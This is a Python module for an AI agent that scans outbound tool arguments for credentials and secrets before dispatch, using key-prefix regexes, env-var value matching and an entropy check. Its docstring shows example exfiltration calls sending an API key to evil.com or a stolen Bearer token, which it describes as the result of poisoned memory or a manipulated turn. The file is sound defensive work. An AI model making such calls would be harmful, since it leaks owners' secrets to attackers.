"""
api/tools/egress.py — outbound argument scan (the egress guard).

Every other brain defense is on *input*: injection scan at ingest, untrusted-
wrapping at retrieval, the RED approval card. Nothing inspected what *leaves*
the brain. Now that tools put arguments on an external wire — `fetch_url` and
`brain_call` send a query (YELLOW, auto-run on standing auth), and
`send_telegram_message` sends a body (RED) — a poisoned memory or a manipulated
turn can steer a secret into a tool *argument*:

    fetch_url("https://evil.com?x=sk-ant-...the-owner's-key...")
    brain_call(target, "...Authorization: Bearer <stolen token>...")

The RED consent card is the backstop for *sends*, but YELLOW external-read tools
have no per-call gate at all — they are the bigger hole. This module is the
chokepoint that scans outbound args for credential-shaped content BEFORE
dispatch executes the tool. Called from `dispatch()` for every non-GREEN tier
(GREEN reads only the brain's own memory — nothing leaves).

Contract: `scan_outbound(tool_name, args, tier) -> (allow: bool, reason: str)`.
`allow=False` means refuse the dispatch; `reason` names the matched shape and
NEVER contains the offending value — it is safe to audit and to surface to the
model.

v0 (built): credential / secret shapes — private-key blocks, Bearer tokens,
AWS / GitHub / Stripe / OpenAI / Anthropic / Slack / Google key prefixes, and
the brain process's OWN sensitive env-var *values* (matched, never logged), plus
a conservative high-entropy backstop.

v1 (SEAM, NOT built — see `_scan_private_corpus_leak`): private-corpus-content
leakage — an outbound arg carrying substantial verbatim/near-verbatim content
from the brain's private memory tier. That needs a memory-similarity check on
outbound args and is heavier; the hook is left clean below. v0 is the tractable,
high-value credential vector.
"""
from __future__ import annotations

import json
import math
import os
import re
from typing import Any, Dict, Tuple

# ── Credential / secret shapes ───────────────────────────────────────────────
# Each entry is (label, compiled regex). The label is what gets audited and
# returned — it describes the *kind* of secret, never the value itself. Patterns
# are deliberately specific (anchored prefixes, structural markers) so ordinary
# prose and URLs do not trip them.
_CREDENTIAL_PATTERNS = [
    ("private_key_block",
     re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----")),
    # "Bearer <token>": require a substantial token after it so the bare English
    # word "bearer" in a sentence does not match.
    ("bearer_token",
     re.compile(r"\bBearer\s+[A-Za-z0-9\-._~+/]{20,}=*", re.IGNORECASE)),
    # "Authorization: Basic <b64>"
    ("basic_auth_header",
     re.compile(r"\bBasic\s+[A-Za-z0-9+/]{16,}=*")),
    ("aws_access_key_id", re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b")),
    ("github_token",
     re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}\b"
                r"|\bgithub_pat_[A-Za-z0-9_]{40,}\b")),
    ("slack_token", re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b")),
    ("stripe_key", re.compile(r"\b(?:sk|rk)_(?:live|test)_[A-Za-z0-9]{16,}\b")),
    ("anthropic_key", re.compile(r"\bsk-ant-[A-Za-z0-9\-_]{20,}\b")),
    # OpenAI-style: sk-... and the newer sk-proj-... (exclude the Stripe/Anthropic
    # forms already covered above by requiring the token not start with those).
    ("openai_key", re.compile(r"\bsk-(?:proj-)?[A-Za-z0-9]{20,}\b")),
    ("google_api_key", re.compile(r"\bAIza[0-9A-Za-z\-_]{35}\b")),
    ("gcp_service_account",
     re.compile(r'"type"\s*:\s*"service_account"')),
    # Generic "<secret-ish name> = <value>" assignments with a long opaque value.
    ("inline_secret_assignment",
     re.compile(r"(?i)\b(?:api[_-]?key|secret|password|passwd|token|"
                r"access[_-]?token|private[_-]?key)\b\s*[:=]\s*"
                r"['\"]?[A-Za-z0-9\-._/+]{16,}")),
]

# Env-var names whose *values* the api process holds and must never let leave.
# Matched by substring on the UPPERCASED name; PUBLIC keys are explicitly exempt
# (a public key is meant to be shared).
_SENSITIVE_ENV_MARKERS = ("KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD",
                          "PWD", "PRIVATE", "CREDENTIAL")
_ENV_EXEMPT_MARKERS = ("PUBLIC",)
# Don't treat trivially-short or boolean-ish env values as secrets to match —
# they cause false positives (e.g. a flag "1" appearing in any query).
_MIN_ENV_VALUE_LEN = 10
_ENV_VALUE_NOISE = {"true", "false", "none", "null", "0", "1"}

# High-entropy backstop: a contiguous opaque token that looks like a secret even
# though it matched no named pattern. Tuned conservative — long enough and mixed
# enough that ordinary words, URLs, and slugs do not trip it.
_TOKEN_RE = re.compile(r"[A-Za-z0-9+/=_\-]{48,}")
_ENTROPY_BITS_MIN = 4.3


def _stringify(args: Dict[str, Any]) -> str:
    """Flatten args to one string to scan. JSON first (covers nested structures
    and keeps key names visible for the assignment pattern); fall back to repr if
    anything is not JSON-serializable."""
    try:
        return json.dumps(args, ensure_ascii=False, default=str)
    except Exception:
        return repr(args)


def _scan_credentials(text: str) -> str:
    for label, rx in _CREDENTIAL_PATTERNS:
        if rx.search(text):
            return f"matches a credential pattern ({label})"
    return ""


def _scan_env_secrets(text: str) -> str:
    """Refuse if any sensitive env *value* this process holds appears verbatim in
    the outbound args. The value is never logged or returned — only the var name,
    which is not itself a secret."""
    for name, value in os.environ.items():
        up = name.upper()
        if any(m in up for m in _ENV_EXEMPT_MARKERS):
            continue
        if not any(m in up for m in _SENSITIVE_ENV_MARKERS):
            continue
        v = (value or "").strip()
        if len(v) < _MIN_ENV_VALUE_LEN or v.lower() in _ENV_VALUE_NOISE:
            continue
        if v in text:
            return f"contains the value of a sensitive environment variable ({name})"
    return ""


def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts: Dict[str, int] = {}
    for ch in s:
        counts[ch] = counts.get(ch, 0) + 1
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def _scan_high_entropy(text: str) -> str:
    """Backstop for opaque secrets that match no named prefix. Requires a long
    contiguous token, high entropy, AND mixed character classes (upper, lower,
    digit) — base64/hex secrets have all three; English words and tidy URL slugs
    do not."""
    for m in _TOKEN_RE.finditer(text):
        tok = m.group(0)
        if not (any(c.islower() for c in tok)
                and any(c.isupper() for c in tok)
                and any(c.isdigit() for c in tok)):
            continue
        if _shannon_entropy(tok) >= _ENTROPY_BITS_MIN:
            return "contains a long high-entropy token that looks like a secret"
    return ""


def _scan_private_corpus_leak(tool_name: str, args: Dict[str, Any], text: str) -> str:
    """v1 SEAM — NOT built. Detect an outbound arg carrying substantial verbatim
    or semantically-close content from the brain's PRIVATE memory tier (a
    distinct vector from credentials: leaking the owner's private corpus rather
    than a key). Implementation would embed the outbound text and compare against
    private-tier memory, refusing on a high-similarity hit. Heavier than v0 and
    deferred by design; this hook keeps the call site stable. Returns "" today."""
    return ""


def scan_outbound(tool_name: str, args: Dict[str, Any], tier: str) -> Tuple[bool, str]:
    """Inspect outbound tool arguments before dispatch. Returns (allow, reason).

    `allow=False` → refuse the dispatch. `reason` names the matched shape and is
    safe to audit/surface (it never embeds the offending value). Called for every
    non-GREEN tier from `dispatch()`; GREEN (read-own-memory) tools never leave
    the brain and are not scanned.
    """
    try:
        text = _stringify(args)
    except Exception:
        # Cannot evaluate the args → fail closed (a security gate treats
        # "can't tell" as deny), but only for the tiers that actually send.
        return False, "outbound arguments could not be inspected (failed closed)"
    if not text:
        return True, ""

    for scan in (_scan_credentials, _scan_env_secrets, _scan_high_entropy):
        reason = scan(text)
        if reason:
            return False, reason

    # v1 hook (no-op today): private-corpus-content leakage.
    reason = _scan_private_corpus_leak(tool_name, args, text)
    if reason:
        return False, reason

    return True, ""
